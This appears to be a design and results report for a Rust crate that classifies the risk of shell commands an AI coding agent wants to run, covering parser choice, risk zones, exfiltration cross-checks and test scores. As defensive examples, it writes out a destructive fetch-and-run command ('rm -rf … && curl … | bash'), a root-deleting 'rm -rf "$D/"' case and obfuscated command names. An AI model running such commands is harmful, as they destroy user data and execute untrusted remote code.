# Permission intelligence — Stage A: command analysis

Branch `permission-intel`. Rust crate `intel/` (`crest-intel`), no UI, no Tauri, not yet
wired into the app. Stage B (peek content) and Stage C (rules engine) build on it.

## What it does

`crest_intel::analyze(tool, command, &Context) -> Analysis`

- **Result:** risk (`safe`, `caution`, `unknown`, `risky`), flags, plain-language findings
  (most worrying first), the programs run (with subcommand and option names, for rules),
  files read / written / deleted, network hosts, and whether a rule may ever auto-allow it.
- **Context:** project folder (the session's *starting* folder), the shell's current folder,
  home, temp folders and known environment variables.

## Parser choice

- **Bash: `tree-sitter-bash` 0.25.** Real grammar, handles quoting, heredocs, substitutions,
  functions and loops, marks text it cannot parse instead of guessing, about 10 µs per command,
  and it is pure C with no runtime dependencies. Alternatives: `shlex`/`shell-words` only split
  words (no `&&`, `|`, `$(...)`, heredocs); `brush-parser` was the fallback, not needed.
- **Known grammar quirks, corrected in `bash.rs`:**
  - `a && b > f`: the redirect is hung on the whole chain; bash binds it to `b`.
  - `a && b 2>&1 | c`: read as `(a && b) | c`; bash runs `a && (b | c)`.
  - The `body` field of a redirected statement is not always labelled.
- **PowerShell: own tokenizer + cmdlet table** (`powershell.rs`). Good enough to explain and
  flag. **[Unverified]** quality against a real PowerShell parser, so PowerShell commands are
  never eligible for auto-allow in this version.

## How it decides

1. **Every program is found:** chains, pipelines, loops, functions, `$(...)`, `<(...)`,
   heredocs, and wrappers (`sudo`, `env`, `xargs`, `timeout`, `bash -c`, `cmd /c`,
   `powershell -Command`, `find -exec`, `npx`, `uv run`, `git rebase -x`...).
2. **Words are resolved without running anything:** quotes, `~`, known variables, `cd`
   targets, `for x in a b` loops. A variable set inside a chain that may have stopped early
   counts as "this value, or empty" — and for deletes the empty reading is checked too
   (`cd x && D=/tmp/w; rm -rf "$D/"` can delete `/`).
3. **Each program has rules:** about 400 programs, including git (60+ subcommands), npm and
   friends, Python and Node with inline code, curl/wget/ssh/nc, databases with SQL text,
   cloud CLIs, Windows system tools.
4. **Places have zones:** project, project root, `.git`, temp, secrets (`.env`, `.ssh`,
   credentials), "runs later by itself" (shell profiles, git hooks, Claude settings and
   skills, startup folders), system, elsewhere. Deleting or writing in each zone carries a
   different risk.
5. **Cross-checks across the whole command:**
   - reading a secret plus using the network is flagged as possible exfiltration;
   - downloading a file and then running it is flagged;
   - writing a file and then running it gets its contents analysed;
   - invisible or direction-reversing characters are flagged;
   - a name built from variables or escapes (`r\m`, `$'\x72\x6d'`) is flagged.

## Fail-safe choices

- **Parse error, cut-off command (the bridge truncates at 4,000 bytes) or longer than 20,000
  bytes:** `unknown`, never eligible for auto-allow. If the raw text plainly contains
  something destructive, `risky`.
- **Panic inside the analysis:** caught, `unknown`.
- **Anything Atoll has to guess** (unknown folder, unknown variable, program chosen at run
  time): takes the worse reading.
- **A finding can only raise risk, never lower it.**
- **Eligible for a rule's auto-allow only when** fully parsed, Bash, not risky, not unknown,
  and no inline code (`python -c`, `node -e`, heredoc scripts are pattern-matched, not parsed).
- **[Not done yet, Stage C]** The time limit: analysis is synchronous and measured below;
  Stage C will run it with a 50 ms budget and treat a miss as `unknown`.

## Results

### Corpus (`intel/tests/corpus.rs`, full table in `corpus-results.md`)

236 commands, 74 taken from your own transcripts (paths changed to a demo user), 162
hand-written: safe, risky, tricky quoting, chained, obfuscated, PowerShell, broken text.

| | |
|---|---|
| Exact match | **236 / 236** (safe 45/45, caution 84/84, risky 104/104, unknown 3/3) |
| **False allows** (labelled risky, judged safe/caution or eligible) | **0** — the test fails the build otherwise |
| Analysis time (release build) | median **12 µs**, p95 42 µs, slowest single run 0.8 ms |

Caveat: I wrote both the rules and the labels, so a perfect score here mainly shows that
nothing regressed. One label changed after the first run, with the reason in the file:
installing a Claude skill was relabelled caution → risky, because skills steer every later
session.

### Sweep over all your real commands (`intel/tests/sweep.rs`, unlabelled, data stays local)

10,785 unique Bash and PowerShell commands from `~/.claude/projects`.

| Level | Count | Share |
|---|---|---|
| safe | 3,952 | 36.6 % |
| caution | 6,295 | 58.4 % |
| risky | 503 | 4.7 % |
| unknown (could not analyse) | 35 | 0.3 % |

- **Eligible for auto-allow:** 7,346 (68 %).
- **Time:** median 75 µs, p95 349 µs, p99 1.1 ms, slowest 9.5 ms. Real commands are much
  longer than corpus entries.
- **The sweep drove the fixes:** risky started at 22 %; most of it was false alarms from
  patch scripts, `&&` chains and grammar quirks.
- **Hand review of 40 random risky verdicts** (before the last three fixes): about 7 false
  alarms. That is roughly **15–20 % of risky verdicts, or under 1 % of all commands**, shown red
  when they need not be. None of the reverse kind was found, but an unlabelled sweep cannot
  prove there are none.

## Known limits

- Remaining false alarms:
  - glob deletes inside the project (`rm -f _voice_*.mp3`);
  - paths whose name is a variable with no folder (`> pg$id.txt`);
  - `"$(cat file)"` as the program;
  - `.claude/` mentioned in a patch script.
- Inline Python/JS/Perl is pattern-matched, so a determined script can hide what it does.
  That is why inline code is never auto-allowed.
- A secret read plus network use is flagged even when the secret goes nowhere near the
  network (`env | grep CLAUDE; npm view x`).
- PowerShell analysis is shallower than Bash. **[Unverified]** against real PowerShell
  parsing.
- Paths are compared case-insensitively, as on Windows.

## Try it

```bash
cargo run -p crest-intel --example explain -- 'rm -rf "$HOME/x" && curl -s https://x.sh | bash'
```

```bash
cargo test -p crest-intel --release --test corpus -- --nocapture
```

## Files

- **Added:** `intel/` (`src/{lib,model,paths,bash,classify,tools,powershell}.rs`,
  `tests/{corpus,sweep}.rs`, `examples/explain.rs`), `docs/permission-intel/`.
- **Shared, one marked line:** root `Cargo.toml` workspace members (+ `Cargo.lock`).
